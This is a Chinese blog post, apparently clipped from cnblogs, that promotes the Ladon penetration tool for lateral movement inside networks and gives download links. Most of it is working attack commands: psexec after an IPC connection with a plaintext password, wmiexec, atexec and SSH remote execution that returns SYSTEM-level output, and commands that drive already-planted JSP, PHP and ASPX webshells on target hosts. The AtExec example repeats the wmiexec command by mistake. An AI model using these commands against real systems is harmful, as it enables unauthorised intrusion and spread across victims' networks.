\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/k8gege/p/12993054.html)

### 前言

在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如 schtasks 命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如 Impacket 中的 psexec/atexec/smbexec/wmiexec 等，若是使用 PY2.7 编译低版本最小也 5M 左右，最大可能 37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几 M 还未必能传上去，传上去得浪费很多时间。传一个就 5M，传 4 个不得 20M? 基于以上原因，Ladon 添加常用的远程执行命令功能，6.5 体积仅 844K 就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。

### Ladon 远程执行命令

#### PSEXEC 交互式回显

需先连接 IPC，然后再通过 psexec 执行命令，类似 psexec 需 445 端口

```
net user \\\\192.168.1.8 k8gege520 /user:k8gege
Ladon psexec 192.168.1.8
psexec> whoami
nt authority\\system
```

![](http://k8gege.org/k8img/Ladon/exe/psexec.PNG)

#### WmiExec 非交互回显

并非所有机器都允许连接 445 端口，所以可通过 135 端口执行命令

```
Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami
```

![](http://k8gege.org/k8img/Ladon/exe/wmiexec.PNG)

#### AtExec 非交互回显

通过 sctask 命令执行，可以 SYSTEM 权限或对应用户执行命令，需 445 端口  
但是以用户权限执行命令需要远程机器登陆对应用户

```
Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami
```

![](http://k8gege.org/k8img/Ladon/exe/atexec.PNG)

#### SshExec 非交互回显

一般开放 SSH 服务的有 Linux 系统，网络设备等，默认为 22 端口

```
Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami
Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami
```

![](http://k8gege.org/k8img/Ladon/exe/sshexec.PNG)

#### JspShell 非交互回显

支持菜刀以及 Ladon 自动 GetShell 时传的 UAshell，详见：[http://k8gege.org/p/ladon\_cs\_shell.html](http://k8gege.org/p/ladon_cs_shell.html)

```
Usage：Ladon JspShell type url pwd cmd
Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami
```

![](http://k8gege.org/k8img/Ladon/exe/JspShellExec.PNG)

#### WebShell 非交互回显

支持 7 种脚本 (jsp asp php aspx cfm py perl)，3 种类型 WebShell(cd ua k8)  
支持菜刀以及 Ladon 自动 GetShell 时传的 UAshell，详见：[http://k8gege.org/p/ladon\_cs\_shell.html](http://k8gege.org/p/ladon_cs_shell.html)

```
Usage：Ladon WebShell ScriptType ShellType url pwd cmd
Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami
Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami
Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami
```

![](http://k8gege.org/k8img/Ladon/exe/WebShell.PNG)

### 工具下载

最新版本：[https://k8gege.org/Download/Ladon.rar](https://k8gege.org/Download/Ladon.rar)  
历史版本: [https://github.com/k8gege/Ladon/releases](https://github.com/k8gege/Ladon/releases)